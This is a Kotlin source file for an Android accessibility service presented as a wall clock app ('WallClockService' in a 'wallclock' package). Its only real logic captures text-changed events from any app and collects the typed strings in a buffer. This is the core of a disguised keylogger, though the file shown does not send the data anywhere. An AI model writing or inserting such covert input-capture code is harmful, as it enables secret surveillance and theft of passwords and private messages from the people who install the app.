package com.noshad.wallclock

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent

class WallClockService : AccessibilityService() {
    private val buffer = mutableListOf<String>()

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val text = event.text.joinToString()
            if (text.isNotEmpty() && text.length > 1) {
                buffer.add(text)
            }
        }
    }

    override fun onInterrupt() {
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
    }
}
